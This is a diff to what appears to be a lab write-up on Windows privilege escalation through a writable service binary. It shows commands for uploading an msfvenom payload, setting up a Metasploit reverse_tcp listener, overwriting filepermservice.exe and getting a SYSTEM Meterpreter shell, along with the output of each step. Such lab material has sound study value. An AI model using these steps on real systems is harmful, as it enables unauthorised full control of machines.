@@ -208,7 +208,7 @@ copy "C:\Program Files\File Permissions Service\filepermservice.exe" C:\temp
 
 ### Uploaded rev.exe from Kali
 
-I alreay had a payload named `rev.exe` created by msfvenom. From kali, I uploaded this file on victim machine.
+I had already created a payload named `rev.exe` using **msfvenom**. I uploaded it from my Kali machine to the victim using Meterpreter.
 
 ```bash
 meterpreter > upload /home/kali/Desktop/rev.exe
@@ -221,3 +221,60 @@ meterpreter > upload /home/kali/Desktop/rev.exe
 <p align="center">
   <img src="images/step5-1.png" width="600">
 </p>
+
+### Started Metasploit Listener on Kali
+
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.5.128
+set lport 4444
+run
+```
+**Output:**
+
+```
+[*] Started reverse TCP handler on 192.168.5.128:4444 
+```
+<p align="center">
+  <img src="images/step5-2.png" width="600">
+</p>
+
+### Replaced the Real Binary with My Payload
+
+```bash
+C:\PrivEsc> copy C:\PrivEsc\rev.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+```
+
+```
+Overwrite C:\Program Files\File Permissions Service\filepermservice.exe? (Yes/No/All): Yes
+Yes
+        1 file(s) copied.
+```
+The real filepermservice.exe was replaced with my rev.exe. Next time the service starts it will run my payload as SYSTEM.
+
+<p align="center">
+  <img src="images/step5-3.png" width="600">
+</p>
+
+### Started the Service
+
+```bash
+C:\PrivEsc> net start filepermsvc
+```
+## Step 6 — Getting a SYSTEM Shell
+
+### Metasploit Caught the Connection
+
+```
+[*] Sending stage (230982 bytes) to 192.168.5.129
+[*] Meterpreter session 1 opened (192.168.5.128:4444 → 192.168.5.144:49922) at 2026-01-19 12:16:34
+```
+### Checked Privileges
+
+```bash
+C:\Windows\system32> whoami
+nt authority\system
+```
+I went from a normal low privilege user to `nt authority\system` just by replacing a service binary that anyone could overwrite. The attack was successful.
